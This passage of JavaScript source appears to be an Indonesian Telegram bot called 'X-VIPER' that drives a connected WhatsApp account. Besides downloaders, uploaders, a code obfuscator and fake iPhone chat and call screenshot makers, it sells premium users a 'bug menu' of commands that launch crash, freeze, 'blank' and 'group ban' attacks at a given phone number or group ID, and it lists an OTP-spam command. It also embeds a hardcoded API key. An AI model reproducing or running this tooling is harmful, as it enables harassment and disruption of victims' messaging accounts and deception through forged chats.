    const processing = await ctx.reply("⏳ _Mengunduh video TikTok..._", { parse_mode: "Markdown" });

    const encodedParams = new URLSearchParams();
    encodedParams.set("url", args);
    encodedParams.set("hd", "1");

    const { data } = await axios.post("https://tikwm.com/api/", encodedParams, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "TikTokBot/1.0",
      },
      timeout: 30000,
    });

    if (!data.data?.play) throw new Error("URL video tidak ditemukan");

    await ctx.deleteMessage(processing.message_id);
    await ctx.replyWithVideo({ url: data.data.play }, {
      caption: `🎵 *${data.data.title || "Video TikTok"}*\n🔗 ${args}\n\n✅ Tanpa watermark`,
      parse_mode: "Markdown",
    });

    if (data.data.music) {
      await ctx.replyWithAudio({ url: data.data.music }, { title: "Audio Original" });
    }
  } catch (err) {
    console.error("[TIKTOK ERROR]", err.message);
    ctx.reply(`❌ Gagal mengunduh: ${err.message}`);
  }
});

// Logging (biar gampang trace error)
function log(message, error) {
  if (error) {
    console.error(`[EncryptBot] ❌ ${message}`, error);
  } else {
    console.log(`[EncryptBot] ✅ ${message}`);
  }
}

bot.command("iqc", async (ctx) => {
  const fullText = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

  try {
    await ctx.sendChatAction("upload_photo");

    if (!fullText) {
      return ctx.reply(
        "🧩 Masukkan teks!\nContoh: /iqc Konichiwa|06:00|100"
      );
    }

    const parts = fullText.split("|");
    if (parts.length < 2) {
      return ctx.reply(
        "❗ Format salah!\n🍀 Contoh: /iqc Teks|WaktuChat|StatusBar"
      );
    }

    let [message, chatTime, statusBarTime] = parts.map((p) => p.trim());

    if (!statusBarTime) {
      const now = new Date();
      statusBarTime = `${String(now.getHours()).padStart(2, "0")}:${String(
        now.getMinutes()
      ).padStart(2, "0")}`;
    }

    if (message.length > 80) {
      return ctx.reply("🍂 Teks terlalu panjang! Maksimal 80 karakter.");
    }

    const url = `https://api.zenzxz.my.id/maker/fakechatiphone?text=${encodeURIComponent(
      message
    )}&chatime=${encodeURIComponent(chatTime)}&statusbartime=${encodeURIComponent(
      statusBarTime
    )}`;

    const response = await fetch(url);
    if (!response.ok) throw new Error("Gagal mengambil gambar dari API");

    const buffer = await response.buffer();

    const caption = `
✨ <b>Fake Chat iPhone Berhasil Dibuat!</b>

💬 <b>Pesan:</b> ${message}
⏰ <b>Waktu Chat:</b> ${chatTime}
📱 <b>Status Bar:</b> ${statusBarTime}
`;

    await ctx.replyWithPhoto({ source: buffer }, { caption, parse_mode: "HTML" });
  } catch (err) {
    console.error(err);
    await ctx.reply("🍂 Gagal membuat gambar. Coba lagi nanti.");
  }
});

//MD MENU
bot.command("fakecall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").split("|");

  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply("❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return ctx.reply("📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    ctx.reply("⚠️ Gagal membuat fakecall.");
  }
});

bot.command("tourl", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply media (foto/video/audio/dokumen) dengan perintah /tourl");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else if (reply.video) {
      fileId = reply.video.file_id;
    } else if (reply.audio) {
      fileId = reply.audio.file_id;
    } else if (reply.document) {
      fileId = reply.document.file_id;
    } else {
      return ctx.reply("❌ Format file tidak didukung. Harap reply foto/video/audio/dokumen.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: path.basename(fileLink.href),
      contentType: "application/octet-stream",
    });

    const uploadRes = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    const url = uploadRes.data;
    ctx.reply(`✅ File berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ Gagal tourl:", err.message);
    ctx.reply("❌ Gagal mengupload file ke URL.");
  }
});

const IMGBB_API_KEY = "76919ab4062bedf067c9cab0351cf632";

bot.command("tourl2", async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply) return ctx.reply("❗ Reply foto dengan /tourl2");

    let fileId;
    if (reply.photo) {
      fileId = reply.photo[reply.photo.length - 1].file_id;
    } else {
      return ctx.reply("❌ i.ibb hanya mendukung foto/gambar.");
    }

    const fileLink = await ctx.telegram.getFileLink(fileId);
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("image", buffer.toString("base64"));

    const uploadRes = await axios.post(
      `https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`,
      form,
      { headers: form.getHeaders() }
    );

    const url = uploadRes.data.data.url;
    ctx.reply(`✅ Foto berhasil diupload:\n${url}`);
  } catch (err) {
    console.error("❌ tourl2 error:", err.message);
    ctx.reply("❌ Gagal mengupload foto ke i.ibb.co");
  }
});

bot.command("zenc", async (ctx) => {
  
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
    return ctx.replyWithMarkdown("❌ Harus reply ke file .js");
  }

  const file = ctx.message.reply_to_message.document;
  if (!file.file_name.endsWith(".js")) {
    return ctx.replyWithMarkdown("❌ File harus berekstensi .js");
  }

  const encryptedPath = path.join(
    __dirname,
    `invisible-encrypted-${file.file_name}`
  );

  try {
    const progressMessage = await ctx.replyWithMarkdown(
      "```css\n" +
        "🔒 EncryptBot\n" +
        ` ⚙️ Memulai (Invisible) (1%)\n` +
        ` ${createProgressBar(1)}\n` +
        "```\n"
    );

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    log(`Mengunduh file: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 10, "Mengunduh");
    const response = await fetch(fileLink);
    let fileContent = await response.text();
    await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

    log(`Memvalidasi kode awal: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
    try {
      new Function(fileContent);
    } catch (syntaxError) {
      throw new Error(`Kode tidak valid: ${syntaxError.message}`);
    }

    log(`Proses obfuscation: ${file.file_name}`);
    await updateProgress(ctx, progressMessage, 40, "Inisialisasi Obfuscation");
    const obfuscated = await JsConfuser.obfuscate(
      fileContent,
      getStrongObfuscationConfig()
    );

    let obfuscatedCode = obfuscated.code || obfuscated;
    if (typeof obfuscatedCode !== "string") {
      throw new Error("Hasil obfuscation bukan string");
    }

    log(`Preview hasil (50 char): ${obfuscatedCode.substring(0, 50)}...`);
    await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

    log(`Validasi hasil obfuscation`);
    try {
      new Function(obfuscatedCode);
    } catch (postObfuscationError) {
      throw new Error(
        `Hasil obfuscation tidak valid: ${postObfuscationError.message}`
      );
    }

    await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
    await fs.writeFile(encryptedPath, obfuscatedCode);

    log(`Mengirim file terenkripsi: ${file.file_name}`);
    await ctx.replyWithDocument(
      { source: encryptedPath, filename: `Invisible-encrypted-${file.file_name}` },
      {
        caption:
          "✅ *ENCRYPT BERHASIL!*\n\n" +
          "📂 File: `" +
          file.file_name +
          "`\n" +
          "🔒 Mode: *Invisible Strong Obfuscation*",
        parse_mode: "Markdown",
      }
    );

    await ctx.deleteMessage(progressMessage.message_id);

    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus: ${encryptedPath}`);
    }
  } catch (error) {
    log("Kesalahan saat zenc", error);
    await ctx.replyWithMarkdown(
      `❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n` +
        "_Coba lagi dengan kode Javascript yang valid!_"
    );
    if (await fs.pathExists(encryptedPath)) {
      await fs.unlink(encryptedPath);
      log(`File sementara dihapus setelah error: ${encryptedPath}`);
    }
  }
});



bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d\nAtau reply pesan user yang ingin ditambahkan");
    } else {
        userId = args[1];
    }
    
    // Ambil durasi
    const durationIndex = ctx.message.reply_to_message ? 1 : 2;
    const duration = parseInt(args[durationIndex]);
    
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

// VERSI MODIFIKASI UNTUK DELPREM (dengan reply juga)
bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    let userId;
    const args = ctx.message.text.split(" ");
    
    // Cek apakah menggunakan reply
    if (ctx.message.reply_to_message) {
        // Ambil ID dari user yang direply
        userId = ctx.message.reply_to_message.from.id.toString();
    } else if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678\nAtau reply pesan user yang ingin dihapus");
    } else {
        userId = args[1];
    }
    
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

//---------(MIDDLEWARE PERIZINAN GROUP ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.chat) return next();

  const isGroup = ctx.chat.type === "group" || ctx.chat.type === "supergroup";
  if (!isGroup) return next();

  const chatId = String(ctx.chat.id);

  // command khusus approval tetap boleh
  const text = ctx.message?.text || "";
  const cmd = text.startsWith("/") ? text.split(" ")[0].toLowerCase() : "";

  const bypass = ["/approved", "/unapproved", "/listapprovedgroup"];

  if (!isGroupApproved(chatId) && !bypass.includes(cmd)) {
    if (ctx.message?.text?.startsWith("/")) {
      await ctx.reply("❌ Group ini belum di-approved oleh owner untuk melanjutkan silahkan 🪧 Format: /approved -100xxxxxxxxxx");
    }
    return;
  }

  return next();
});
//---------(MIDDLEWARE JOIN CH ) ---------//
async function checkJoin(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(`@${CHANNEL_USERNAME}`, ctx.from.id);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (err) {
    console.log("CHECK JOIN ERROR:", err.message);
    return false;
  }
}

bot.use(async (ctx, next) => {
  try {
    if (!ctx.from) return next();

    const text = ctx.message?.text;
    if (!text) return next();

    // cuma cek kalau message command
    if (!text.startsWith("/")) return next();

    const joined = await checkJoin(ctx);

    if (!joined) {
      return ctx.reply(
        "❌ Kamu wajib join channel dulu sebelum menggunakan bot ini.",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 JOIN CHANNEL",
                  url: `https://t.me/${CHANNEL_USERNAME}`
                }
              ]
            ]
          }
        }
      );
    }

    return next();
  } catch (e) {
    console.log("MIDDLEWARE JOIN ERROR:", e.message);
    return ctx.reply("❌ Terjadi error saat cek akses channel.");
  }
});

//---------(MIDDLEWARE BLOCK CMD ) ---------//
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

// ==============================
// CONTOH COMMAND
// ==============================
// ==============================
// CONTOH COMMAND
// ==============================
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const isOwner = userId == ownerID;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "yes" : "no";
  const senderStatus = isWhatsAppConnected ? "aktif" : "tidak";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const menuMessage = ` 
<blockquote>•.¸♡X-VIPER♡¸.•
────────────────────
☰ OPTION DEVELOPERS
OWNER : @ferdianzxc
PARTNER : Olanz
SYSTEM : Auto-Update Latest
ACCESS : Collaboration Verified
Sender : ${senderStatus}
Runtime : ${runtimeStatus}
────────────────────
☰ OPTION CREATE
KING OWNER : @ferdianzxc
PRINCESS : enggak punya
────────────────────</blockquote>
`;

  const keyboard = [
        [
            { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id:  "6163328887813051603" }
        ]
    ];

   ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

// ======================
// CALLBACK UNTUK MENU UTAMA
// ======================
bot.action("/start", async (ctx) => {
  const userId = ctx.from.id;
  const premiumStatus = isPremiumUser(ctx.from.id) ? "yes" : "no";
  const senderStatus = isWhatsAppConnected ? "aktif" : "tidak";
  const runtimeStatus = formatRuntime();

  const menuMessage = `
<blockquote>•.¸♡X-VIPER♡¸.•
────────────────────
☰ OPTION DEVELOPERS
OWNER : @ferdianzxc
PARTNER : Olanz
SYSTEM : Auto-Update Latest
ACCESS : Collaboration Verified
Sender : ${senderStatus}
Runtime : ${runtimeStatus}
────────────────────
☰ OPTION CREATE
KING OWNER : @ferdianzxc
PRINCESS : enggak punya
────────────────────</blockquote>
`;
  const keyboard = [
        [
            { text: "𝐎𝐩𝐞𝐧 𝐌𝐞𝐧𝐮", callback_data: "/setting_menu", style: "success", icon_custom_emoji_id:  "6163328887813051603" }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action("coming_soon", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu ⛔",
    { show_alert: true }
  );
});

bot.action("menu_akhir", async (ctx) => {
  await ctx.answerCbQuery(
    "⛔ Anda Telah Di Menu Akhir ⛔",
    { show_alert: true }
  );
});

bot.action('/bug_menu', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✔" : "✘";
    const runtimeStatus = formatRuntime();
    const bug_menuMenu = `
<blockquote>•.¸♡X-VIPER♡¸.•
────────────────────
<tg-emoji emoji-id="5267231489610760977">👁‍🗨</tg-emoji> 𝐈𝐍𝐈𝐓𝐈𝐀𝐋𝐈𝐙𝐄 𝐁𝐔𝐆

📌 <b>BUG COMMANDS</b>
  ⚡ /vnfbudoblan    → deankclick · dulldozer · delay?
  ⚡ /jatimxarlend   → DelayHard · DelayInvis · BebasSpam
  ⚡ /blankjeje      → Blank Click
  ⚡ /forcloseclick  → Click Foreclose
  ⚡ /blankngloco    → Blank X Delay Hard
  ⚡ /punyawibzz     → Delay Hard
  ⚡ /shadow         → Delay Blank
  ⚡ /buggroup       → Spam Teks V1
  ⚡ /xyosagne       → Spam Teks V2
  ⚡ /gb1            → Group Ban V1
  ⚡ /gb2            → Group Ban V2
  ⚡ /gb3            → Group Ban V3

📋 <b>GROUP UTILITY</b>
  🆔 /getgroupjid    → Lihat JID grup
  🔍 /groupinfo      → Info grup dari link
  ➕ /joingroup      → Gabung grup via link

────────────────────
Status Sender: ${senderStatus}
Runtime: ${runtimeStatus}
</blockquote>
`;

    const keyboard = [
        [
            { text: "𝐁𝐚𝐜𝐤", callback_data: "/setting_menu", style: "danger", icon_custom_emoji_id: "6210968712304923662" }
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

bot.action('/setting_menu', async (ctx) => {
    const setting_menuMenu = `
<blockquote>☰ SYSTEM CONTROL PANEL 
(Page 2/3)
•.¸♡X-VIPER♡¸.•
────────────────────

☰ CONNECT BOT / UPDATE
♡ /addpairing → Add Sender
♡ /killsession → Delete Sender
♡ /update → Auto Update

☰ OWNERS SETTINGS
♡ /addpremgrup → Add All Member
♡ /delpremgrup → Remove All Member
♡ /listpremgrup → List Group
♡ /unblockcmd → Block Command
♡ /bukacmd → Unblock Command
♡ /listblockcmd → List block Command

☰ FEATURE FUN MENU
♡ /getgithub → Download Repo
♡ /deploygithub → Deploy Zip
♡ /spamotp → OTP Spam
♡ /spotify → Search Lagu
────────────────────
Security Mode : ACTIVE 
Network       : X-viper Core</blockquote>`;

    const keyboard = [
        [
            { text: "𝐁𝐚𝐜𝐤", callback_data: "/start", style: "danger", icon_custom_emoji_id:  "5463167176099780578" }
        ],
        [
            { text: "𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "/bug_menu", style: "success", icon_custom_emoji_id:  "5267231489610760977" }
        ]
    ];

    try {
        await ctx.editMessageCaption(setting_menuMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di setting_menu menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
}); 

//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://raw.githubusercontent.com/skaf873/X-VIPER/main/X-VIPER.js"; // GANTI RAW URL
  
// ✅ foto /start
const thumbnailUp = "https://files.catbox.moe/j8ci57.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./X-VIPER.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

//------------------(CASE NO SPAM)--------------------//
bot.command("vnfbudoblan", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") {
        return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply("📌 Format: /vnfbudoblan 628xxxx");
    const target = formatTarget(args[1]);
    if (!target) return ctx.reply("❌ Nomor tidak valid.");
    await ctx.reply(`✅ Memulai VnFBuldoBlank untuk ${args[1]}`);
    await VnFBuldoBlank(sock, target);
    await ctx.reply(`✅ Selesai VnFBuldoBlank untuk ${args[1]}`);
});

//------------------(COMMAND BAN GROUP)--------------------//
bot.command("gb1", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") {
        return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply("📌 Format: /gb1 628xxxxxxx-xxxxxx@g.us");
    const target = args[1];
    if (!target.includes("@g.us")) return ctx.reply("❌ Harap masukkan JID grup (contoh: 628xxxxxx-xxxxxx@g.us)");
    await ctx.reply(`✅ Memulai GroupBan1 untuk ${target}`);
    try {
        await GroupBan1(sock, target);
        await ctx.reply(`✅ Selesai GroupBan1 untuk ${target}`);
    } catch (e) {
        await ctx.reply(`❌ Gagal: ${e.message}`);
    }
});

bot.command("gb2", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") {
        return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply("📌 Format: /gb2 628xxxxxxx-xxxxxx@g.us");
    const target = args[1];
    if (!target.includes("@g.us")) return ctx.reply("❌ Harap masukkan JID grup (contoh: 628xxxxxx-xxxxxx@g.us)");
    await ctx.reply(`✅ Memulai GroupBan2 untuk ${target}`);
    try {
        await GroupBan2(sock, target);
        await ctx.reply(`✅ Selesai GroupBan2 untuk ${target}`);
    } catch (e) {
        await ctx.reply(`❌ Gagal: ${e.message}`);
    }
});

bot.command("gb3", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isPremiumUser(userId) && ctx.chat.type === "private") {
        return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
    }
    const args = ctx.message.text.split(" ");
    if (!args[1]) return ctx.reply("📌 Format: /gb3 628xxxxxxx-xxxxxx@g.us");
    const target = args[1];
    if (!target.includes("@g.us")) return ctx.reply("❌ Harap masukkan JID grup (contoh: 628xxxxxx-xxxxxx@g.us)");
    await ctx.reply(`✅ Memulai GroupBan3 untuk ${target}`);
    await GroupBan3(sock, target);
    await ctx.reply(`✅ Selesai GroupBan3 untuk ${target}`);
});

bot.command("xyosagne", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /xyosagne 628xxxxxxx-xxxxxx@g.us");
  const target = args[1];
  if (!target.includes("@g.us")) return ctx.reply("❌ Harap masukkan JID grup (contoh: 628xxxxxx-xxxxxx@g.us)");
  
  // Cek apakah bot ada di grup (opsional, tapi disarankan)
  try {
    const groups = await sock.groupFetchAllParticipating();
    if (!Object.keys(groups).includes(target)) {
      return ctx.reply(`❌ Bot tidak tergabung di grup tersebut.\nGunakan /joingroup <link> untuk bergabung.`);
    }
  } catch (e) {}
  
  await ctx.reply(`✅ Memulai XyoSagne untuk ${target}`);
  await XyoSagne(target);
  await ctx.reply(`✅ Selesai XyoSagne untuk ${target}`);
});

bot.command("buggroup", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /buggroup 628xxxxxxx-xxxxxx@g.us");
  const target = args[1]; // target langsung dalam format JID grup (misal 628xxxxxx-xxxxxx@g.us)
  if (!target.includes("@g.us")) return ctx.reply("❌ Harap masukkan JID grup yang valid (contoh: 628xxxxxx-xxxxxx@g.us)");
  await ctx.reply(`✅ Memulai Bug Group untuk ${target}`);
  await bugGroup(sock, target);
  await ctx.reply(`✅ Selesai Bug Group untuk ${target}`);
});

bot.command("shadow", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /shadow 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");
  await ctx.reply(`✅ Memulai Shadow untuk ${args[1]}`);
  await shadow(sock, target);
  await ctx.reply(`✅ Selesai Shadow untuk ${args[1]}`);
});

bot.command("punyawibzz", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /punyawibzz 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");
  await ctx.reply(`✅ Memulai punyawibzz untuk ${args[1]}`);
  await punyawibzz(sock, target);
  await ctx.reply(`✅ Selesai punyawibzz untuk ${args[1]}`);
});

bot.command("blankngloco", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /blankngloco 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");
  await ctx.reply(`✅ Memulai BlankNgloco untuk ${args[1]}`);
  await BlankNgloco(sock, target);
  await ctx.reply(`✅ Selesai BlankNgloco untuk ${args[1]}`);
});

bot.command("jatimxarlend", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }
  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /jatimxarlend 628xxxx");
  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");
  await ctx.reply(`✅ Memulai JatimXArlend untuk ${args[1]}`);
  await JatimXArlend(sock, target);
  await ctx.reply(`✅ Selesai JatimXArlend untuk ${args[1]}`);
});

bot.command("blankjeje", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) return ctx.reply("📌 Format: /blankjeje 628xxxx");

  const target = formatTarget(args[1]);
  if (!target) return ctx.reply("❌ Nomor tidak valid.");

  await ctx.reply(`✅ Memulai Jeje Blank untuk ${args[1]}`);
  await BlankJeje(sock, target);
  await ctx.reply(`✅ Selesai Jeje Blank untuk ${args[1]}`);
});

